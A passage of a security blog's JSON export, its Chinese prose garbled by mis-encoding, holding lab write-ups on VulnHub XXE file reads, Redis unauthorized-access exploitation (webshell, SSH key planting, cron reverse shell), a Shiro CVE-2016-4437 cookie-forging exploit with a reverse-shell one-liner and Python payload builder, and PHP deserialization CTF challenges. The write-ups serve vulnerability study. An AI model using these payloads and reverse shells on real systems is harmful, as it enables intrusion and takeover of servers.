-d\n```\n\n# Exploit\nä½¿ç”¨å·¥å…·æ£€æµ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206041231208.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206041231652.png)\n\n","tags":["ååºåˆ—åŒ–","Weblogic"],"categories":["æ¼æ´å¤ç°"]},{"title":"vulnhub-XXE Lab:1","url":"/2022/06/03/vulnhub-XXELab-1/","content":"# ç¯å¢ƒ\né¡¹ç›®åœ°å€:https://www.vulnhub.com/entry/xxe-lab-1,254/\næ”»å‡»æœº kali:172.16.17.140\né¶æœº:172.16.17.141\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«ä¸€ä¸‹,åªå¼€äº†80ç«¯å£åº”è¯¥æ˜¯è¿™ä¸ª\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032004003.png)\n\nè¯¦ç»†æ‰«æ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032008378.png)\n\nrobots.txtå­˜åœ¨ä¸¤ä¸ªç¦æ­¢çˆ¬å–çš„ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032009689.png)\n\nadmin.phpæ— æ³•è®¿é—®\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032010229.png)\n\nXXEç›®å½•ç›´æ¥è·³è½¬åˆ°ä¸€ä¸ªç™»å½•é¡µé¢\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032011673.png)\n\næ‰«æä¸€ä¸‹ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032016456.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032017129.png)\n\næ‰«å‡ºæ¥çš„ç›®å½•éƒ½åœ¨xxeä¸‹é¢\n\n# fuzz\nå¯¹åŠŸèƒ½ç‚¹è¿›è¡Œæµ‹è¯• /xxe\nxxe,ç™»å½•ç‚¹æŠ“åŒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032020685.png)\nä½¿ç”¨xmlä¼ é€’æ•°æ®,ç»“åˆé¶åœºåå­—,æ­¤å¤„åº”è¯¥å­˜åœ¨xmlå®ä½“æ³¨å…¥\n\n## æ„é€ payload\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032024438.png)\nå­˜åœ¨xmlæ³¨å…¥æ¼æ´,ä½†æ˜¯é€šè¿‡éœ€è¦æ‰¾åˆ°flag\n```xml\n<?xml version=\"1.0\" ?> <!DOCTYPE r \n        [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM \"file:///etc/passwd\"> \n                ]> \n<root><name>&sp;</name><password>hj</password></root>\n```\n\n- æ„é€ ä¼ªåè®®è¯»å–/admin.php\nbase64ç¼–ç é˜²æ­¢phpä»£ç è¢«æ‰§è¡Œ\n```xml\n<?xml version=\"1.0\" ?> <!DOCTYPE r [ \n        <!ELEMENT r ANY > <!ENTITY sp SYSTEM \"php://filter/read=convert.base64-encode/resource=admin.php\"> \n        ]> \n<root><name>&sp;</name><password>hj</password></root>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032030915.png)\n\n## ç™»å½•\n- base64è§£ç \nè¯»å–åˆ°è´¦å·å¯†ç \n  ![](https://raw.githubusercontent.com/chencicici/images/main/202206032031373.png)\n  \n- ç™»å½•\nå¯†ç æ˜¯md5åŠ å¯†,è§£å¯†å‡ºæ¥\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202206032034930.png)\n  \nå‘ç°æ— æ³•ç™»å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032037275.png)\n\nç»§ç»­æŸ¥çœ‹admin.phpæºç å‘ç°è¿˜æœ‰ä¸€ä¸ªè·¯å¾„,flag this here\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032038786.png)\n\nè®¿é—®,å­˜åœ¨æ–‡ä»¶ä½†æ˜¯æ— ä»»ä½•å›æ˜¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032039056.png)\n\n## ç»•æ¥ç»•å»çš„è§£ç \nç”¨ä¸Šé¢çš„payloadè¯»å–æºç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206032042053.png)\n\nè§£ç å‡ºæ¥,flagåœ¨è¿™é‡Œ,æ˜æ˜¾åˆæ˜¯ç¼–ç è¿‡çš„\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032043496.png)\n\nå¯†æ–‡32ä½,çŒœæµ‹æ˜¯base32\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032045190.png)\n\nåˆæ˜¯ç¼–ç è¿‡çš„,çœ‹åˆ°=ç›´æ¥ä¸¢base64,ä¸€ä¸ªå°æŠ€å·§,base64æœ«å°¾æœ‰=,base32æ²¡æœ‰\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032047754.png)\n\nè¿™ä¸ªæ–‡ä»¶åº”è¯¥æ˜¯flagäº†,ç”¨ä¸Šé¢çš„payloadè¯»å–\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032049966.png)\n\nå†è§£ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206032050649.png)\n\nçœ‹åˆ°`$`,çŒœæµ‹ä¸ºphpä»£ç æ··æ·†è¿‡åçš„,æ‹¿å»è¿è¡Œ\næœ€ååœ¨è¿è¡ŒæŠ¥é”™ä¸­æ‰¾åˆ°flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032055796.png)\n\n\n  \n","tags":["vulnhub","XXE"],"categories":["æ‰“é¶"]},{"title":"redisæœªæˆæƒè®¿é—®åˆ©ç”¨","url":"/2022/06/02/redisæœªæˆæƒè®¿é—®åˆ©ç”¨/","content":"# æ¼æ´è§£æ\nRedisæœªæˆæƒè®¿é—®åœ¨4.x/5.0.5ä»¥å‰ç‰ˆæœ¬ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨master/slaveæ¨¡å¼åŠ è½½è¿œç¨‹æ¨¡å—ï¼Œé€šè¿‡åŠ¨æ€é“¾æ¥åº“çš„æ–¹å¼æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\n\n# åˆ©ç”¨å‰æ\nredisç›´æ¥æš´éœ²åœ¨å¤–ç½‘,æ— è®¿é—®é™åˆ¶\næ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚\n\n# é¶åœºç¯å¢ƒ\nä½¿ç”¨vulhubç¯å¢ƒ\n\n```bash\ncd redis/4-unacc \ndocker-compose up -d\n```\n\n# æ¼æ´åˆ©ç”¨\n\n## ä¸‹è½½è¿æ¥å®¢æˆ·ç«¯\n```bash\nwget http://download.redis.io/redis-stable.tar.gz\ntar -zxvf redis-stable.tar.gz\ncd redis-stable \nmake \ncp src/redis-cli /usr/bin/\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021617001.png)\n\n\n\n## rediså‘½ä»¤\n```bash\nä½¿ç”¨å¯†ç è¿æ¥reids\nredis-cli -h ip -p port -a password\n\næ— å¯†ç è¿æ¥redis\nredis-cli -h ip\n\næµ‹è¯•è¿é€šæ€§\nping\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021622678.png)\n\n\n## å†™webshell\nåˆ©ç”¨æ¡ä»¶\n- çŸ¥é“çœŸå®è·¯å¾„\n- è¯»å†™æƒé™\n\n\nå› ä¸ºé¶åœºæ²¡æœ‰webæœåŠ¡,å†™å…¥tmpç›®å½•ä¸‹\n```redis\n10.20.146.195:6379> config set dir /tmp #è®¾ç½®ç»å¯¹è·¯å¾„\nOK\n10.20.146.195:6379> config set dbfilename shell.php #å†™å…¥æ–‡ä»¶å\nOK\n10.20.146.195:6379> set shell \"\\r\\n\\r\\n<?php phpinfo()?>\\r\\n\" #å†™å…¥æ•°æ®\nOK\n10.20.146.195:6379> save #ä¿å­˜\nOK\n```\nCONFIG å‘½ä»¤æŸ¥çœ‹æˆ–è®¾ç½®é…ç½®é¡¹\ndbfilename å¤‡ä»½æ–‡ä»¶\n\n\\n\\r\\nä¸ºæ¢è¡Œç¬¦,åœ¨å†™å…¥çš„æ—¶å€™redisä¼šè‡ªåŠ¨å†™å…¥å…¶ä»–æ•°æ®,é¿å…ä»£ç æ— æ³•æ­£å¸¸æ‰§è¡Œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021643250.png)\n\n## å†™å…¥å…¬é’¥\né¶æœºä¸Šæ²¡æœ‰ssh,å…ˆå®‰è£…,å†ç”Ÿæˆå…¬ç§ç§˜é’¥\n```bash\napt-get update\napt-get install openssh-client\napt-get install openssh-server\nserver ssh start\nssh-keygen -t rsa\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021656260.png)\n\nåœ¨æ”»å‡»æœºä¸Šä¹Ÿç”Ÿæˆå…¬ç§ç§˜é’¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021657083.png)\n\nå†™å…¥åˆ°key.txt\n```bash\n(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > key.txt\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021708197.png)\n\nåœ¨redisä¸­ä¿®æ”¹å¤‡ä»½ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022022347.png)\næŠ¥é”™ (error) ERR Changing directory: No such file or directory\nå› ä¸ºæ­¤å¤„,æ˜¯vulhubç¯å¢ƒ,æ²¡æœ‰ä»¥rootæƒé™å»å¯åŠ¨,æ‰€ä»¥æ²¡æœ‰æƒé™,æ¼”ç¤ºä¸äº†\n\nç„¶åæ‰§è¡Œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022024528.png)\n```bash\nconfig set dbfilename \"authorized_keys\"\nsave\n```\n\nå†™å…¥ä¹‹åç›´æ¥ä½¿ç”¨æ”»å‡»æœºssh redisæœåŠ¡å™¨å°±å¯ä»¥å…å¯†ç™»å½•\n\n\n## è®¡åˆ’ä»»åŠ¡åå¼¹shell\nåˆ©ç”¨æ¡ä»¶\n- éœ€è¦ä»¥rootç”¨æˆ·\n\né‡‡ç”¨crontabæ¯åˆ†é’Ÿè¿æ¥æ”»å‡»æœºä¸€æ¬¡\n```bash\nconfig set dir /var/spool/cron/crontabs\nconfig set dbfilename root\nset xxx \"\\n\\n\\n*/1 * * * * /bin/bash -i>&/dev/tcp/æ”»å‡»æœºip/4444 0>&1\\n\\n\\n\"\nsave\n```\n\næ”»å‡»æœºç›‘å¬\n```bash\nnc -lvp 4444\n```\né¶åœºä¸æ˜¯rootæƒé™è¿è¡Œçš„redisæ¼”ç¤ºä¸äº†\n\n## EXP-åˆ©ç”¨ä¸»ä»å¤åˆ¶RCE\nRedisæœªæˆæƒè®¿é—®åœ¨4.x/5.0.5ä»¥å‰ç‰ˆæœ¬ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨master/slaveæ¨¡å¼åŠ è½½è¿œç¨‹æ¨¡å—ï¼Œé€šè¿‡åŠ¨æ€é“¾æ¥åº“çš„æ–¹å¼æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\n\n[expä¸‹è½½åœ°å€](https://github.com/vulhub/redis-rogue-getshell)\n\n- ç¼–è¯‘\n```bash\ncd RedisModulesSDK/\nmake\n```\n\n- ä½¿ç”¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022100318.png)\n\n```bash\npython3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c \"id\"\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022107518.png)\n\n","tags":["vulhub","redis"],"categories":["æ¼æ´å¤ç°"]},{"title":"Shiro1.2.4ååºåˆ—åŒ–æ¼æ´å¤ç°","url":"/2022/06/02/Shiro1-2-4ååºåˆ—åŒ–æ¼æ´å¤ç°/","content":"\n#  æ¼æ´è§£æ\nApache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰\nApache Shiroæ˜¯ä¸€ä¸ªJavaå®‰å…¨æ¡†æ¶ï¼Œæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚åªè¦rememberMeçš„AESåŠ å¯†ç§˜é’¥æ³„éœ²ï¼Œæ— è®ºshiroæ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚\nApache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\n\n# æ¼æ´ç¯å¢ƒ\nä½¿ç”¨vulhubç¯å¢ƒ\næ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨ä¸€ä¸ªä½¿ç”¨äº†Apache Shiro 1.2.4çš„WebæœåŠ¡ï¼š\n```bash\ncd vulhub/shiro/CVE-2016-4437\ndocker-compose up -d\n```\næœåŠ¡å¯åŠ¨åï¼Œè®¿é—®http://your-ip:8080å¯ä½¿ç”¨admin:vulhubè¿›è¡Œç™»å½•ã€‚\n\n# æ¼æ´å¤ç°\nç™»å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021343076.png)\n\n## åˆ©ç”¨å·¥å…·-ShiroAttack2\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021349099.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021349877.png)\n\n## æ‰‹å·¥å¤ç°\nç™»å½•æŠ“åŒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021343076.png)\n\nshiroæ¼æ´æŒ‡çº¹\nåœ¨è¯·æ±‚åŒ…çš„Cookieä¸­ä¸ºï¼ŸremeberMeå­—æ®µèµ‹ä»»æ„å€¼\nè¿”å›åŒ…ä¸­å­˜åœ¨set-Cookieï¼šremeberMe=deleteMe\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021415805.png)\n\n### åå¼¹shell\nåˆ¶ä½œåå¼¹shellåºåˆ—åŒ–æ•°æ®\n\nå°†å‘½ä»¤è¿›è¡Œbase64ç¼–ç \n```bash\nbash -i >& /dev/tcp/192.168.0.1/4444 0>&1\n```\n\nå¾—åˆ°payload\n```bash\nbash -c {'echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS80NDQ0IDA+JjE='}|{base64,-d}|{bash,-i}\n```\n\né€šè¿‡ysoserialå·¥å…·ä¸­çš„JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬6666ç«¯å£å¹¶æ‰§è¡Œåå¼¹shellå‘½ä»¤ï¼Œ\n```bash\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {'echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS80NDQ0IDA+JjE='}|{base64,-d}|{bash,-i}'\n```\n\n### æ„é€ payload\nä½¿ç”¨pythonæ„é€ payload,ç§˜é’¥ä¸ºShiroé»˜è®¤ç§˜é’¥\n```python\nimport sys\n\nimport uuid\nimport base64\nimport subprocess\nfrom Crypto.Cipher import AES\n\ndef encode_rememberme(command):\n    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)\n    BS = AES.block_size\n    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n    key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\")\n    iv = uuid.uuid4().bytes\n    encryptor = AES.new(key, AES.MODE_CBC, iv)\n    file_body = pad(popen.stdout.read())\n    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))\n    return base64_ciphertext\nif __name__ == '__main__':\n    payload = encode_rememberme(sys.argv[1])\n    print(\"rememberMe={0}\".format(payload.decode()))\n```\n\næ‰§è¡Œ\n```bash\npython3 AES.py ip:6666\n```\n\nè·å¾—pyload\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021454232.png)\n\n\nnc ç›‘å¬\n```bash\nnc lvp 4444\n```\n\nä¼ªé€ cookieå‘é€\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021512925.png)\n\nåå¼¹shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021513505.png)\n\n\n## æ€»ç»“\næ¼æ´äº§ç”Ÿçš„æ ¹æœ¬åŸå› å°±æ˜¯å› ä¸ºAESåŠ å¯†çš„keyç¡¬ç¼–ç åœ¨æºç ä¸­ï¼Œä»è€Œå¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ³„éœ²çš„AES keyä¼ªé€ rememberMeå­—æ®µç”Ÿæˆcookieå€¼ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚å› æ­¤ï¼ŒæœåŠ¡å™¨ç«¯å¯¹cookieå€¼çš„å¤„ç†è¿‡ç¨‹åè¿‡æ¥å°±æ˜¯payloadçš„äº§ç”Ÿè¿‡ç¨‹ï¼šå‘½ä»¤=>è¿›è¡Œåºåˆ—åŒ–=>AESåŠ å¯†=>base64ç¼–ç =>äº§ç”ŸRememberMe Cookieå€¼ã€‚","tags":["ååºåˆ—åŒ–","Apache","shiro","vulhub"],"categories":["æ¼æ´å¤ç°"]},{"title":"CTF-ååºåˆ—åŒ–","url":"/2022/05/31/CTF-ååºåˆ—åŒ–/","content":"# æ¼æ´è¯¦è§£\nååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ï¼Œå³æŠŠå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„æ•°æ®è½¬æ¢ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚ä¾‹å¦‚å°†äºŒè¿›åˆ¶æ•°æ®æµæˆ–æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­è¿˜åŸä¸ºå¯¹è±¡ã€‚\nåºåˆ—åŒ–ï¼šæŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼Œå³æŠŠå¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„æ•°æ®çš„è¿‡ç¨‹ã€‚ä¾‹å¦‚å°†å†…å­˜ä¸­çš„å¯¹è±¡è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®æµæˆ–æ–‡ä»¶ï¼Œåœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥æ˜¯å­—èŠ‚æˆ–æ˜¯XMLç­‰æ ¼å¼ã€‚\nç®€å•æ¥è¯´,åºåˆ—åŒ–å°±åƒæ˜¯æŠŠæ•°æ®åŠ å¯†,åƒjsonä¸€æ ·çš„æ ¼å¼,ååºåˆ—åŒ–å°±æ˜¯è§£å¯†æˆåŸæ¥çš„æ ·å­\n\n\n\n# æ¼æ´å¯èƒ½å‡ºç°çš„ä½ç½®\n1. è§£æè®¤è¯tokenã€sessionçš„ä½ç½®\n2. å°†åºåˆ—åŒ–çš„å¯¹è±¡å­˜å‚¨åˆ°ç£ç›˜æ–‡ä»¶æˆ–å­˜å…¥æ•°æ®åº“åååºåˆ—åŒ–æ—¶çš„ä½ç½®ï¼Œå¦‚è¯»å–jsonæ–‡ä»¶ï¼Œxmlæ–‡ä»¶ç­‰\n3. å°†å¯¹è±¡åºåˆ—åŒ–ååœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼Œå¦‚ä¼ è¾“jsonæ•°æ®ï¼Œxmlæ•°æ®ç­‰\n4. å‚æ•°ä¼ é€’ç»™ç¨‹åº\n5. ä½¿ç”¨RMIåè®®ï¼Œè¢«å¹¿æ³›ä½¿ç”¨çš„RMIåè®®å®Œå…¨åŸºäºåºåˆ—åŒ–\n6. ä½¿ç”¨äº†ä¸å®‰å…¨çš„æ¡†æ¶æˆ–åŸºç¡€ç±»åº“ï¼Œå¦‚JMX ã€Fastjsonå’ŒJacksonç­‰\n7. å®šä¹‰åè®®ç”¨æ¥æ¥æ”¶ä¸å‘é€åŸå§‹çš„javaå¯¹è±¡\n\n# PHPååºåˆ—åŒ–\n![](https://raw.githubusercontent.com/chencicici/images/main/202205311958842.png)\n\nåŸç†ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQLæ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚å½“è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚\n\n## é­”æœ¯æ–¹æ³•\n```php\n__construct()\nå…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚\n__destruct()\nææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯,ä»£ç ç»“æŸæ—¶æ‰§è¡Œã€‚\n```\n[PHPé­”æœ¯æ–¹æ³•è¯¦è§£](https://www.cnblogs.com/20175211lyz/p/11403397.html)\n\n## åºåˆ—åŒ–å®ä¾‹\n[PHPä»£ç åœ¨çº¿æ‰§è¡Œ](https://www.dooccn.com/php/)\n```php\nserialize() //å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²\nunserialize() //å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡\n```\n\nåºåˆ—åŒ–\n```php\n<?php\n$key=\"syst1m\";\necho serialize($key);\n?>\n```\n\nè¾“å‡º\n```\ns:6:\"syst1m\";\n```\n\n\nååºåˆ—åŒ–\n```php\n<?php\n$key='s:6:\"syst1m\"';\necho unserialize($key);\n?>\n```\n\nè¾“å‡º\n```\nsyst1m\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312020809.png)\n\n\n## bugku-ç‚¹loginå’‹æ²¡ååº”\nåœ°å€\n[bugku](https://ctf.bugku.com/challenges/detail/id/109.html)\n\næ‰“å¼€é¡µé¢\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312156157.png)\n\nç™»å½•,å‘ç°æ²¡ååº”,æ ¹æœ¬æ²¡æœ‰è¡¨å•æäº¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312158710.png)\n\næŸ¥çœ‹æºç ,æœ‰ä¸€ä¸ªcssæ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312159492.png)\n\næ‰“å¼€å‘ç°æç¤º\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312200927.png)\n\nè¾“å…¥http://url/?32145,é¡µé¢å›æ˜¾æºç \n![](https://raw.githubusercontent.com/chencicici/images/main/202205312202898.png)\n\n\n````php\n<?php\nerror_reporting(0);\n$KEY='ctf.bugku.com';\ninclude_once(\"flag.php\");\n$cookie = $_COOKIE['BUGKU'];\nif(isset($_GET['32145'])){\n    show_source(__FILE__);\n}\nelseif (unserialize($cookie) === \"$KEY\")\n{   \n    echo \"$flag\";\n}\nelse {\n?>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>Login</title>\n<link rel=\"stylesheet\" href=\"admin.css\" type=\"text/css\">\n</head>\n<body>\n<br>\n<div class=\"container\" align=\"center\">\n  <form method=\"POST\" action=\"#\">\n    <p><input name=\"user\" type=\"text\" placeholder=\"Username\"></p>\n    <p><input name=\"password\" type=\"password\" placeholder=\"Password\"></p>\n    <p><input value=\"Login\" type=\"button\"/></p>\n  </form>\n</div>\n</body>\n</html>\n\n<?php\n}\n?>\n````\n### ä»£ç å®¡è®¡\nåˆ¤æ–­cookieä¸­æ˜¯å¦æºå¸¦å‚æ•°'BUGKU'\næ­¤å¤„æœ‰ä¸€ä¸ªå‘,è¿›å…¥ä»£ç ååˆ¤æ–­getæä»·çš„æ•°æ®æ˜¯å¦ä¸º32145,ä¸æˆç«‹åˆ¤æ–­,ååºåˆ—åŒ–$cookieæ˜¯å¦ç­‰äº$key,æˆç«‹è¾“å‡ºflag\næ‰€ä»¥æˆ‘ä»¬åœ¨æäº¤æ•°æ®çš„æ—¶å€™,å°±ä¸èƒ½å¸¦å‚æ•°32145\n```php\nif(isset($_GET['32145'])){\n    show_source(__FILE__);\n}elseif (unserialize($cookie) === \"$KEY\")\n{   \n    echo \"$flag\";\n}\n```\n\n### payload\n\n```php\n<?php\n\n$KEY='ctf.bugku.com';\necho serialize($KEY);\n?>\n```\n\nè·å¾—å€¼\n```\ns:13:\"ctf.bugku.com\";\n```\n\nå¸¦å…¥cookieä¸­å»è¯·æ±‚,ä¸å¸¦urlä¸­ä¸èƒ½æºå¸¦32145å‚æ•°\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312212892.png)\n\n\n## ç½‘é¼æ¯2020é’é¾™ç»„-AreUSerialz \nåœ°å€\n[ctfhub-AreUSerialz](https://www.ctfhub.com/#/challenge)\n\næ‰“å¼€ç¯å¢ƒå°±æ˜¾ç¤ºæºç \n![](https://raw.githubusercontent.com/chencicici/images/main/202205312033140.png)\n\n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n### ä»£ç å®¡è®¡\né¦–å…ˆæ˜¯ä¸€é“æœ‰ç±»ååºåˆ—åŒ–é¢˜\n\næ¥å—strå‚æ•°, æ‰§è¡Œ`is_valid()`å‡½æ•°,æ‰§è¡Œunserialize()å‡½æ•°,ååºåˆ—åŒ–\n```php\nif(isset($_GET{'str'})) {\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n}\n```\n\nis_valid()å‡½æ•°æ£€æŸ¥å¯¹è±¡å˜é‡æ˜¯å¦å·²ç»å®ä¾‹åŒ–,åºåˆ—åŒ–åˆ™è¿”å›\n```php\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n```\n\nè¿›å…¥é¦–å…ˆå…ˆæ‰§è¡Œæ„é€ æ–¹æ³•,å®šä¹‰å˜é‡,æ‰§è¡Œ`process()`æ–¹æ³•\n```php\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    